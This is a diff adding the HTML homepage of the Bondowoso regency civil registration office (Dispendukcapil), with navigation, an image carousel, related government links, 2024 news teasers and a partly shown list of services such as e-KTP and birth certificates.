@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html>
+	<head>
+
+		<!-- Basic -->
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">	
+
+		<title>BERANDA  - DISPENDUKCAPIL</title>
+
+		<meta name="keywords" content="DISPENDUKCAPIL, Kab Bondowoso, Dinas Kependudukan dan Pencatatan Sipil, BERANDA" />
+		<meta name="description" content="Dinas Kependudukan dan Pencatatan Sipil (DISPENDUKCAPIL) Kabupaten Bondowoso">
+		<meta name="author" content="Diskominfo Bondowoso">
+		<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"/>
+				<!-- Favicon -->
+		<link rel="shortcut icon" href="https://dispendukpencapil.bondowosokab.go.id/logo.png" type="image/x-icon" />
+		<link rel="apple-touch-icon" href="https://dispendukpencapil.bondowosokab.go.id/logo.png">
+
+		<!-- Mobile Metas -->
+		<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1.0, shrink-to-fit=no">
+
+
+
+		<!-- Web Fonts  -->
+		<link id="googleFonts" href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800%7CShadows+Into+Light&display=swap" rel="stylesheet" type="text/css">
+		<!-- Vendor CSS -->
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/bootstrap/css/bootstrap.min.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/fontawesome-free/css/all.min.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/animate/animate.compat.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/simple-line-icons/css/simple-line-icons.min.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/owl.carousel/assets/owl.carousel.min.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/owl.carousel/assets/owl.theme.default.min.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/magnific-popup/magnific-popup.min.css">
+		<!-- Theme CSS -->
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/css/theme.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/css/theme-elements.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/css/theme-blog.css">
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/css/theme-shop.css">
+
+		<!-- Skin CSS -->
+		<link id="skinCSS" rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/css/skins/skin-corporate-10.css">
+		<!-- Theme Custom CSS -->
+		<link rel="stylesheet" href="https://dispendukpencapil.bondowosokab.go.id/assets/css/custom.css">
+		<!-- Head Libs -->
+		<script src="https://dispendukpencapil.bondowosokab.go.id/assets/vendor/modernizr/modernizr.min.js"></script>
+		<!-- Google tag (gtag.js) -->
+		<script async src="https://www.googletagmanager.com/gtag/js?id=G-B2H05QEE8K"></script>
+		<script>
+			window.dataLayer = window.dataLayer || [];
+			function gtag(){dataLayer.push(arguments);}
+			gtag('js', new Date());
+
+			gtag('config', 'G-B2H05QEE8K');
+		</script>
+			</head>
+
+	<body data-plugin-page-transition>
+		<div class="body">
+			<header id="header" class="header-transparent header-effect-shrink" data-plugin-options="{'stickyEnabled': true, 'stickyEffect': 'shrink', 'stickyEnableOnBoxed': true, 'stickyEnableOnMobile': false, 'stickyChangeLogo': true, 'stickyStartAt': 30, 'stickyHeaderContainerHeight': 70}">
+				<div class="header-body border-top-0 bg-dark box-shadow-none">
+					<div class="header-container container container-xl-custom">
+						<div class="header-row">
+							<div class="header-column">
+								<div class="header-row">
+									<div class="header-logo">
+										<a href="index.html">
+											<img alt="Porto" width="250" height="70" src="https://dispendukpencapil.bondowosokab.go.id/logo-dispenduk.png">
+										</a>
+									</div>
+								</div>
+							</div>
+							<div class="header-column justify-content-end">
+								<div class="header-row">
+									<div class="header-nav header-nav-links header-nav-dropdowns-dark header-nav-light-text order-2 order-lg-1">
+										<div class="header-nav-main header-nav-main-mobile-dark header-nav-main-square header-nav-main-dropdown-no-borders header-nav-main-effect-2 header-nav-main-sub-effect-1">
+        <nav class="collapse">
+            <ul class="nav nav-pills" id="mainNav">
+                                    <li >
+                        <a class="dropdown-item                     
+                    " href="https://dispendukpencapil.bondowosokab.go.id">
+                            Home
+                        </a>
+                                            </li>
+                                    <li  class="dropdown" >
+                        <a class="dropdown-item  dropdown-toggle                     
+                    " href="">
+                            Profil
+                        </a>
+                                                    <ul class="dropdown-menu">
+            <li >
+            <a class="dropdown-item"                href=""
+            >Tentang Kami
+                            </a>
+                    </li>
+            <li >
+            <a class="dropdown-item"                href="https://dispendukpencapil.bondowosokab.go.id/maklumat-layanan"
+            >Maklumat Pelayanan
+                            </a>
+                    </li>
+            <li >
+            <a class="dropdown-item"                href="https://dispendukpencapil.bondowosokab.go.id/visi-misi-motto"
+            >Visi dan Misi
+                            </a>
+                    </li>
+    </ul>
+
+                                            </li>
+                                    <li  class="dropdown" >
+                        <a class="dropdown-item  dropdown-toggle                     
+                    " href="https://dispendukpencapil.bondowosokab.go.id//berita/semua">
+                            Berita
+                        </a>
+                                                    <ul class="dropdown-menu">
+            <li >
+            <a class="dropdown-item"                href="https://dispendukpencapil.bondowosokab.go.id/maklumat-layanan"
+            >Info Dukcapil
+                            </a>
+                    </li>
+            <li >
+            <a class="dropdown-item"                href="https://dispendukpencapil.bondowosokab.go.id/maklumat-layanan"
+            >Info Layanan
+                            </a>
+                    </li>
+    </ul>
+
+                                            </li>
+                                    <li >
+                        <a class="dropdown-item                     
+                    " href="https://dispendukpencapil.bondowosokab.go.id/maklumat-layanan">
+                            Layanan
+                        </a>
+                                            </li>
+                                    <li >
+                        <a class="dropdown-item                     
+                    " href="https://dispendukpencapil.bondowosokab.go.id/maklumat-layanan">
+                            Data &amp; Statistik
+                        </a>
+                                            </li>
+                            </ul>
+        </nav>
+    </div>
+
+
+										
+										<button class="btn header-btn-collapse-nav" data-bs-toggle="collapse" data-bs-target=".header-nav-main nav">
+											<i class="fas fa-bars"></i>
+										</button>
+									</div>
+									<!-- <div class="header-nav-features header-nav-features-light header-nav-features-no-border header-nav-features-lg-show-border order-1 order-lg-2">
+										<div class="header-nav-feature header-nav-features-search d-inline-flex">
+											<a href="#" class="header-nav-features-toggle text-decoration-none" data-focus="headerSearch" aria-label="Search"><i class="fas fa-search header-nav-top-icon"></i></a>
+											<div class="header-nav-features-dropdown header-nav-features-dropdown-mobile-fixed" id="headerTopSearchDropdown">
+												<form role="search" action="page-search-results.html" method="get">
+													<div class="simple-search input-group">
+														<input class="form-control text-1" id="headerSearch" name="q" type="search" value="" placeholder="Search...">
+														<button class="btn" type="submit" aria-label="Search">
+															<i class="fas fa-search header-nav-top-icon"></i>
+														</button>
+													</div>
+												</form>
+											</div>
+										</div>
+										<div class="header-nav-feature header-nav-features-cart d-inline-flex ms-2">
+											<a href="#" class="header-nav-features-toggle" aria-label="">
+												<img src="img/icons/icon-cart-light.svg" width="14" alt="" class="header-nav-top-icon-img">
+												<span class="cart-info">
+														<span class="cart-qty">1</span>
+													</span>
+											</a>
+											<div class="header-nav-features-dropdown" id="headerTopCartDropdown">
+												<ol class="mini-products-list">
+													<li class="item">
+														<a href="#" title="Camera X1000" class="product-image"><img src="img/products/product-1.jpg" alt="Camera X1000"></a>
+														<div class="product-details">
+															<p class="product-name">
+																<a href="#">Camera X1000 </a>
+															</p>
+															<p class="qty-price">
+																1X <span class="price">$890</span>
+															</p>
+															<a href="#" title="Remove This Item" class="btn-remove"><i class="fas fa-times"></i></a>
+														</div>
+													</li>
+												</ol>
+												<div class="totals">
+													<span class="label">Total:</span>
+													<span class="price-total"><span class="price">$890</span></span>
+												</div>
+												<div class="actions">
+													<a class="btn btn-dark" href="#">View Cart</a>
+													<a class="btn btn-primary" href="#">Checkout</a>
+												</div>
+											</div>
+										</div>
+									</div> -->
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</header>
+			<div role="main" class="main">
+				
+	<section class="section section-with-shape-divider border-0 py-0 m-0">
+					<div class="shape-divider shape-divider-bottom z-index-3" style="height: 136px;">
+						<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 1920 136" preserveAspectRatio="xMinYMin">
+							<path d="M 0 0.11 L 0 136 L 1920 136 L 1920 1.9 C 1650.0482 79.0955 1327.0648 134 980 134 C 615.6218 134 277.7878 84.5059 0 0.11 Z" fill="#ffffff"></path>
+						</svg>
+					</div>
+					<div class="owl-carousel owl-carousel-light  owl-carousel-light-init-fadeIn  owl-theme manual dots-inside dots-horizontal-center show-dots-hover show-dots-xs nav-style-1 nav-inside nav-inside-plus nav-primary nav-md nav-font-size-md show-nav-hover mb-0" data-plugin-options="{'autoplayTimeout': 5000}" style="height: 100vh; opacity: 1;">
+						<div class="owl-stage-outer">
+							<div class="owl-stage">
+																	<div class="owl-item position-relative  animated " style="background-image: url(/uploads/sliders/f603e5a1ff4e83b47b934aac1bd040ce.jpg); background-size: cover; background-position: center; height: 100vh;">
+										<div class="container position-relative z-index-3 h-100">
+											<div class="row justify-content-center align-items-center h-100">
+												<div class="col-lg-6">
+													<div class="d-flex flex-column align-items-center">
+														
+														<!-- <a href="#" class="btn btn-primary btn-modern font-weight-bold text-3 py-3 btn-px-5 mt-1 appear-animation animated fadeInUpShorter appear-animation-visible invisible" data-appear-animation="fadeInUpShorter" data-appear-animation-delay="1800" data-plugin-options="{'minWindowWidth': 0}" style="animation-delay: 1800ms;">GET STARTED NOW!</a> -->
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+																	<div class="owl-item position-relative  animated " style="background-image: url(/uploads/sliders/106f125893c6b95ed8997ca7d2478a77.jpg); background-size: cover; background-position: center; height: 100vh;">
+										<div class="container position-relative z-index-3 h-100">
+											<div class="row justify-content-center align-items-center h-100">
+												<div class="col-lg-6">
+													<div class="d-flex flex-column align-items-center">
+														
+														<!-- <a href="#" class="btn btn-primary btn-modern font-weight-bold text-3 py-3 btn-px-5 mt-1 appear-animation animated fadeInUpShorter appear-animation-visible invisible" data-appear-animation="fadeInUpShorter" data-appear-animation-delay="1800" data-plugin-options="{'minWindowWidth': 0}" style="animation-delay: 1800ms;">GET STARTED NOW!</a> -->
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+																	<div class="owl-item position-relative  animated " style="background-image: url(/uploads/sliders/3e7027cef8438274e53e3732747fdb17.jpg); background-size: cover; background-position: center; height: 100vh;">
+										<div class="container position-relative z-index-3 h-100">
+											<div class="row justify-content-center align-items-center h-100">
+												<div class="col-lg-6">
+													<div class="d-flex flex-column align-items-center">
+														
+														<!-- <a href="#" class="btn btn-primary btn-modern font-weight-bold text-3 py-3 btn-px-5 mt-1 appear-animation animated fadeInUpShorter appear-animation-visible invisible" data-appear-animation="fadeInUpShorter" data-appear-animation-delay="1800" data-plugin-options="{'minWindowWidth': 0}" style="animation-delay: 1800ms;">GET STARTED NOW!</a> -->
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+																	<div class="owl-item position-relative  animated " style="background-image: url(/uploads/sliders/cd1dbc517197fba3ccbaa15d58211f70.jpg); background-size: cover; background-position: center; height: 100vh;">
+										<div class="container position-relative z-index-3 h-100">
+											<div class="row justify-content-center align-items-center h-100">
+												<div class="col-lg-6">
+													<div class="d-flex flex-column align-items-center">
+														
+														<!-- <a href="#" class="btn btn-primary btn-modern font-weight-bold text-3 py-3 btn-px-5 mt-1 appear-animation animated fadeInUpShorter appear-animation-visible invisible" data-appear-animation="fadeInUpShorter" data-appear-animation-delay="1800" data-plugin-options="{'minWindowWidth': 0}" style="animation-delay: 1800ms;">GET STARTED NOW!</a> -->
+													</div>
+												</div>
+											</div>
+										</div>
+									</div>
+																<!-- Carousel Slide 1 -->
+
+
+								<!-- Carousel Slide 2 -->
+								
+
+							</div>
+						</div>
+													<div class="owl-nav">
+								<button type="button" role="presentation" class="owl-prev"></button>
+								<button type="button" role="presentation" class="owl-next"></button>
+							</div>
+												<div class="owl-dots mb-5">
+															<button role="button" class="owl-dot active"><span></span></button>
+																	<button role="button" class="owl-dot"><span></span></button>
+																	<button role="button" class="owl-dot"><span></span></button>
+																	<button role="button" class="owl-dot"><span></span></button>
+															
+						</div>
+					</div>
+				</section>    <div class="home-intro bg-primary" id="home-intro">
+	<div class="container">
+		<div class="row justify-content-center align-items-center">
+			<div class="col-lg-8 text-center">
+				<blockquote class="blockquote-quaternary">
+					<p>"Dinas Dukcapil berkomitmen untuk selalu memberikan pelayanan yang membahagiakan bagi masyarakat"</p>
+					<footer class="text-light">
+						<cite title="Source Title">Drs. Agung Tri Handono, SH. MM</cite>
+					</footer>
+				</blockquote>
+			</div>
+		</div>
+	</div>
+</div>    <section class="section bg-color-light border-0 pb-0 m-0">
+					<div class="container">
+						<div class="row">
+							<div class="col-lg-12 text-center appear-animation animated fadeInUpShorter appear-animation-visible" data-appear-animation="fadeInUpShorter" style="animation-delay: 100ms;">
+								<h2 class="font-weight-normal text-6 pb-2 mb-4">
+									<strong class="font-weight-extra-bold">Link Terkait</strong>
+								</h2>
+							</div>
+						</div>
+					</div>
+					<div class="image-gallery sort-destination full-width mb-0">
+													<div class="isotope-item">
+								<div class="image-gallery-item mb-0 appear-animation animated fadeInLeftShorter appear-animation-visible" data-appear-animation="fadeInLeftShorter" data-appear-animation-delay="700" style="animation-delay: 700ms;">
+									<a href="https://web.dukcapil.kemendagri.go.id/web/" aria-label="" title="Web IKD" target="_blank">
+									<span class="thumb-info thumb-info-centered-info thumb-info-no-borders">
+										<span class="thumb-info-wrapper">
+											<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/ef1284a5bffd61c3cdd2a77075471bc2.jpg" class="img-fluid" alt="">
+											<span class="thumb-info-title">
+												<span class="thumb-info-inner">Web IKD</span>
+												<span class="thumb-info-type">Selengkapnya</span>
+											</span>
+											<span class="thumb-info-action">
+												<!-- <span class="thumb-info-action-icon"><i class="fas fa-plus"></i></span> -->
+											</span>
+										</span>
+									</span>
+									</a>
+								</div>
+							</div>
+													<div class="isotope-item">
+								<div class="image-gallery-item mb-0 appear-animation animated fadeInLeftShorter appear-animation-visible" data-appear-animation="fadeInLeftShorter" data-appear-animation-delay="700" style="animation-delay: 700ms;">
+									<a href="http://s.id/wa_dukcapilbwoso" aria-label="" title="Layanan Via Whatsapp" target="_blank">
+									<span class="thumb-info thumb-info-centered-info thumb-info-no-borders">
+										<span class="thumb-info-wrapper">
+											<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/04dd06be2035c761cc41622cee955b6a.jpg" class="img-fluid" alt="">
+											<span class="thumb-info-title">
+												<span class="thumb-info-inner">Layanan Via Whatsapp</span>
+												<span class="thumb-info-type">Selengkapnya</span>
+											</span>
+											<span class="thumb-info-action">
+												<!-- <span class="thumb-info-action-icon"><i class="fas fa-plus"></i></span> -->
+											</span>
+										</span>
+									</span>
+									</a>
+								</div>
+							</div>
+													<div class="isotope-item">
+								<div class="image-gallery-item mb-0 appear-animation animated fadeInLeftShorter appear-animation-visible" data-appear-animation="fadeInLeftShorter" data-appear-animation-delay="700" style="animation-delay: 700ms;">
+									<a href="https://said.bondowosokab.go.id/auth/login" aria-label="" title="SAID" target="_blank">
+									<span class="thumb-info thumb-info-centered-info thumb-info-no-borders">
+										<span class="thumb-info-wrapper">
+											<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/3f775e9f0c6fc8d7b341d4800e3319b2.jpg" class="img-fluid" alt="">
+											<span class="thumb-info-title">
+												<span class="thumb-info-inner">SAID</span>
+												<span class="thumb-info-type">Selengkapnya</span>
+											</span>
+											<span class="thumb-info-action">
+												<!-- <span class="thumb-info-action-icon"><i class="fas fa-plus"></i></span> -->
+											</span>
+										</span>
+									</span>
+									</a>
+								</div>
+							</div>
+													<div class="isotope-item">
+								<div class="image-gallery-item mb-0 appear-animation animated fadeInLeftShorter appear-animation-visible" data-appear-animation="fadeInLeftShorter" data-appear-animation-delay="700" style="animation-delay: 700ms;">
+									<a href="https://www.lapor.go.id/" aria-label="" title="LAPOR" target="_blank">
+									<span class="thumb-info thumb-info-centered-info thumb-info-no-borders">
+										<span class="thumb-info-wrapper">
+											<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/c5342f0471bb5e17ffe6d0e838823437.jpg" class="img-fluid" alt="">
+											<span class="thumb-info-title">
+												<span class="thumb-info-inner">LAPOR</span>
+												<span class="thumb-info-type">Selengkapnya</span>
+											</span>
+											<span class="thumb-info-action">
+												<!-- <span class="thumb-info-action-icon"><i class="fas fa-plus"></i></span> -->
+											</span>
+										</span>
+									</span>
+									</a>
+								</div>
+							</div>
+													<div class="isotope-item">
+								<div class="image-gallery-item mb-0 appear-animation animated fadeInLeftShorter appear-animation-visible" data-appear-animation="fadeInLeftShorter" data-appear-animation-delay="700" style="animation-delay: 700ms;">
+									<a href="https://layananonline.dukcapil.kemendagri.go.id/Terpusat/Cetak/" aria-label="" title="Cetak Dokumen Kependudukan Online" target="_blank">
+									<span class="thumb-info thumb-info-centered-info thumb-info-no-borders">
+										<span class="thumb-info-wrapper">
+											<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/47fec960d09a67b5db48e2cad1cbe5e8.jpg" class="img-fluid" alt="">
+											<span class="thumb-info-title">
+												<span class="thumb-info-inner">Cetak Dokumen Kependudukan Online</span>
+												<span class="thumb-info-type">Selengkapnya</span>
+											</span>
+											<span class="thumb-info-action">
+												<!-- <span class="thumb-info-action-icon"><i class="fas fa-plus"></i></span> -->
+											</span>
+										</span>
+									</span>
+									</a>
+								</div>
+							</div>
+											</div>
+					<br>
+				</section>
+    <section class="section section-with-background section-height-4 border-0 pb-5 m-0 appear-animation animated fadeIn appear-animation-visible" data-appear-animation="fadeIn" style="animation-delay: 100ms; background-image: url('https://dispendukpencapil.bondowosokab.go.id/blue.png');">
+					<div class="container">
+						<!-- <div class="row">
+							<div class="col-lg-12 text-center appear-animation animated fadeInUpShorter appear-animation-visible" data-appear-animation="fadeInUpShorter" style="animation-delay: 100ms;">
+								<h2 class="font-weight-normal text-6 pb-2 mb-4"><strong class="font-weight-extra-bold">Berita Terbaru</strong></h2>
+							</div>
+						</div> -->
+						<div class="row">
+							<div class="col-lg-12 text-center appear-animation animated fadeInUpShorter appear-animation-visible text-white" data-appear-animation="fadeInUpShorter" data-appear-animation-delay="400" style="animation-delay: 400ms;">
+								<h2 class="font-weight-normal text-6 pb-2 mb-4" style="color: white !important;">
+									<strong class="font-weight-extra-bold">Berita Terbaru</strong>
+								</h2>
+							</div>
+						</div>
+					</div>
+					<div class="container">
+						<div class="row justify-content-center recent-posts appear-animation animated fadeInUpShorter appear-animation-visible" data-appear-animation="fadeInUpShorter" data-appear-animation-delay="200" style="animation-delay: 200ms;">
+																							<div class="col-sm-8 col-md-4 mb-4 mb-md-0">
+									<article>
+										<div class="row">
+											<div class="col">
+												<a href="https://dispendukpencapil.bondowosokab.go.id/berita/akhirnya-finish-parade-roadshow-dukcapil-2024" class="text-decoration-none">
+													<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/kegiatan/87e318e830e2f233ceaba58aac8a2220.jpg" class="img-fluid hover-effect-2 mb-3" alt="">
+												</a>
+											</div>
+										</div>
+										<!-- <div class="row">
+                                            <div class="col">
+                                                <p class="text-color-primary text-2 mb-1">LOREM IPSUM DOLOR SIT</p>
+                                                <h4 class="line-height-5 ls-0"><a href="blog-post.html" class="text-dark text-decoration-none">Lorem ipsum dolor sit amet, consectetur</a></h4>
+                                                <p class="text-color-dark opacity-7 mb-3">Lorem ipsum dolor sit amet, coctetur adipiscing elit.</p>
+                                                <a href="/" class="read-more text-color-primary font-weight-semibold text-2">VIEW MORE <i class="fas fa-chevron-right text-3 ms-2"></i></a>
+                                            </div>
+                                        </div> -->
+										<div class="row">
+											<div class="col-auto pe-0">
+												<div class="date">
+													<span class="day bg-color-blue text-color-blue font-weight-extra-bold">07</span>
+													<span class="month bg-primary font-weight-semibold text-color-light text-1">Mar</span>
+												</div>
+											</div>
+											<div class="col ps-1">
+												<h4 class="line-height-3 text-4"><a href="https://dispendukpencapil.bondowosokab.go.id/berita/akhirnya-finish-parade-roadshow-dukcapil-2024" class="text-dark">Akhirnya FINISH !!!!!  PARADE ROADSHOW DUKCAPIL 2024</a></h4>
+												<p class="text-color-dark line-height-5 opacity-6 pe-4 mb-1">BONDOWOSO &amp;ndash; Kamis (07/03/2024) berlokasi di Aula Kantor Kecamatan Curahdami, Dukcapil Bondowoso mengakhiri rangkaian acara awal ta...</p>
+												<a href="https://dispendukpencapil.bondowosokab.go.id/berita/akhirnya-finish-parade-roadshow-dukcapil-2024" class="read-more text-color-dark font-weight-semibold text-2">SELENGKAPNYA <i class="fas fa-chevron-right text-1 ms-1"></i></a>
+											</div>
+										</div>
+									</article>
+								</div>
+																							<div class="col-sm-8 col-md-4 mb-4 mb-md-0">
+									<article>
+										<div class="row">
+											<div class="col">
+												<a href="https://dispendukpencapil.bondowosokab.go.id/berita/kolaborasi-disependukcapil-dengan-pengadilan-agama-bondowoso" class="text-decoration-none">
+													<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/kegiatan/d6033ed690fb3e1a933be409bc9ffeb9.jpg" class="img-fluid hover-effect-2 mb-3" alt="">
+												</a>
+											</div>
+										</div>
+										<!-- <div class="row">
+                                            <div class="col">
+                                                <p class="text-color-primary text-2 mb-1">LOREM IPSUM DOLOR SIT</p>
+                                                <h4 class="line-height-5 ls-0"><a href="blog-post.html" class="text-dark text-decoration-none">Lorem ipsum dolor sit amet, consectetur</a></h4>
+                                                <p class="text-color-dark opacity-7 mb-3">Lorem ipsum dolor sit amet, coctetur adipiscing elit.</p>
+                                                <a href="/" class="read-more text-color-primary font-weight-semibold text-2">VIEW MORE <i class="fas fa-chevron-right text-3 ms-2"></i></a>
+                                            </div>
+                                        </div> -->
+										<div class="row">
+											<div class="col-auto pe-0">
+												<div class="date">
+													<span class="day bg-color-blue text-color-blue font-weight-extra-bold">20</span>
+													<span class="month bg-primary font-weight-semibold text-color-light text-1">Feb</span>
+												</div>
+											</div>
+											<div class="col ps-1">
+												<h4 class="line-height-3 text-4"><a href="https://dispendukpencapil.bondowosokab.go.id/berita/kolaborasi-disependukcapil-dengan-pengadilan-agama-bondowoso" class="text-dark">KOLABORASI DISEPENDUKCAPIL DENGAN PENGADILAN AGAMA BONDOWOSO</a></h4>
+												<p class="text-color-dark line-height-5 opacity-6 pe-4 mb-1">Bondowoso, Selasa 20 Februari 2024 mungkin akan menjadi hari bahagia dan bersejarah bagi 9 pasang pasutri yang mengikuti sidang itsbat m...</p>
+												<a href="https://dispendukpencapil.bondowosokab.go.id/berita/kolaborasi-disependukcapil-dengan-pengadilan-agama-bondowoso" class="read-more text-color-dark font-weight-semibold text-2">SELENGKAPNYA <i class="fas fa-chevron-right text-1 ms-1"></i></a>
+											</div>
+										</div>
+									</article>
+								</div>
+																							<div class="col-sm-8 col-md-4 mb-4 mb-md-0">
+									<article>
+										<div class="row">
+											<div class="col">
+												<a href="https://dispendukpencapil.bondowosokab.go.id/berita/pemilih-pemula-diimbau-segera-rekam-e-ktp-agar-memiliki-hak-pilih" class="text-decoration-none">
+													<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/kegiatan/b905e4e3d910876fdcdd5fb184ab01ff.jpg" class="img-fluid hover-effect-2 mb-3" alt="">
+												</a>
+											</div>
+										</div>
+										<!-- <div class="row">
+                                            <div class="col">
+                                                <p class="text-color-primary text-2 mb-1">LOREM IPSUM DOLOR SIT</p>
+                                                <h4 class="line-height-5 ls-0"><a href="blog-post.html" class="text-dark text-decoration-none">Lorem ipsum dolor sit amet, consectetur</a></h4>
+                                                <p class="text-color-dark opacity-7 mb-3">Lorem ipsum dolor sit amet, coctetur adipiscing elit.</p>
+                                                <a href="/" class="read-more text-color-primary font-weight-semibold text-2">VIEW MORE <i class="fas fa-chevron-right text-3 ms-2"></i></a>
+                                            </div>
+                                        </div> -->
+										<div class="row">
+											<div class="col-auto pe-0">
+												<div class="date">
+													<span class="day bg-color-blue text-color-blue font-weight-extra-bold">07</span>
+													<span class="month bg-primary font-weight-semibold text-color-light text-1">Feb</span>
+												</div>
+											</div>
+											<div class="col ps-1">
+												<h4 class="line-height-3 text-4"><a href="https://dispendukpencapil.bondowosokab.go.id/berita/pemilih-pemula-diimbau-segera-rekam-e-ktp-agar-memiliki-hak-pilih" class="text-dark">Pemilih Pemula Diimbau Segera Rekam e-KTP Agar Memiliki Hak Pilih</a></h4>
+												<p class="text-color-dark line-height-5 opacity-6 pe-4 mb-1">BONDOWOSO &amp;ndash; Dinas Kependudukan dan Pencatatan Sipil (Disdukcapil) Kabupaten Bondowoso sedang berfokus untuk melakukan perekaman e-...</p>
+												<a href="https://dispendukpencapil.bondowosokab.go.id/berita/pemilih-pemula-diimbau-segera-rekam-e-ktp-agar-memiliki-hak-pilih" class="read-more text-color-dark font-weight-semibold text-2">SELENGKAPNYA <i class="fas fa-chevron-right text-1 ms-1"></i></a>
+											</div>
+										</div>
+									</article>
+								</div>
+							
+							
+							<div class="text-center">
+								<br>
+								<a href="https://dispendukpencapil.bondowosokab.go.id/berita/semua" class="btn btn-arrow-effect-1 bg-transparent text-primary border-0 p-0 me-3">Berita Selengkapnya<i class="fas fa-arrow-right ms-2"></i></a>
+							</div>
+						</div>
+					</div>
+				</section>    <div id="examples" class="py-3 px-4 bg-light">
+					<div class="row">
+						<div class="row">
+							<div class="col">
+								<div class="container">
+									<div class="row">
+										<div class="col-lg-12 text-center appear-animation animated fadeInUpShorter appear-animation-visible" data-appear-animation="fadeInUpShorter" style="animation-delay: 100ms;">
+											<h2 class="font-weight-normal text-6 pb-2 mb-4"><strong class="font-weight-extra-bold">Layanan Kami</strong></h2>
+										</div>
+									</div>
+								</div>
+								<div class="owl-carousel owl-theme show-nav-title show-nav-title-both-sides owl-loaded owl-drag owl-carousel-init" data-plugin-options="{'items': 6, 'margin': 10, 'loop': false, 'nav': true, 'dots': false}" style="height: auto;">	
+									<div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all 0s ease 0s; width: 1502px;">
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/f635b5de1a36a2e5f9c28cc62972af17.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">KTP Elektronik</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/b4a22ff139207bc7b64bdc7c0bbd5364.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Kartu Keluarga</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/773ef26f161ea31edca2364ca23c0b4a.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Akta Kelahiran</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/52038c3eb4c5996bbb60194c52dc321c.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Kartu Identitas Anak</span>
+															</span>
+														</span>
+													</span>
+												</div>
+											</a>
+																					<a href="https://dispendukpencapil.bondowosokab.go.id/" target="_blank">
+												<div class="owl-item active" style="width: 204.5px; margin-right: 10px;">
+													<span class="thumb-info thumb-info-no-borders thumb-info-no-borders-rounded thumb-info-lighten thumb-info-bottom-info thumb-info-bottom-info-dark thumb-info-bottom-info-dark-linear thumb-info-centered-icons">
+														<span class="thumb-info-wrapper">
+															<img src="https://dispendukpencapil.bondowosokab.go.id/uploads/link/4a2c53b99ec1fafba72871a558c2e1a2.jpg" class="img-fluid" alt="">
+															<span class="thumb-info-title">
+																<span class="thumb-info-inner line-height-1">Akta Kematian</span>
